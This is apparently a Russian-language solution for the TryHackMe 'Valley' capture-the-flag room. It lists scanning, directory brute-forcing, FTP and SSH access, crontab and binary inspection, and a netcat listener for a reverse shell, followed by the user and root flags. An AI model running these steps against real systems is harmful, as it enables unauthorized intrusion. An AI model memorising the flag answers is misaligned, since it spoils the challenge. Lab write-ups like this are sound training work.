

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Valley](https://tryhackme.com/r/room/valleype) 

Всего 1 заданиe:
## Задание 1
Загрузите систему и найдите способ получить доступ вплоть до root!
### Ответьте на вопросы ниже
Что такое флаг пользователя?
```commandline
nmap -sC -sV -p- <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 2>/dev/null
# http://<IP>/dev1243224123123/
# http://<IP>/dev1243224123123/dev.js
# siemDev:
ftp <IP> -p 37370
get siemHTTP2.pcapng -
cat index.html
# valleyDev:
ssh  valleyDev@<IP>
cat user.txt
```
```commandline
THM{k@l1_1n_th3_v@lley}
```
Что такое корневой флаг?
```commandline
sudo -l
cat /etc/crontab
cat /photos/script/photosEncrypt.py
./valleyAuthenticator
file valleyAuthenticator
strings valleyAuthenticator
nc -nvlp 1234
root.txt
```
```commandline
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)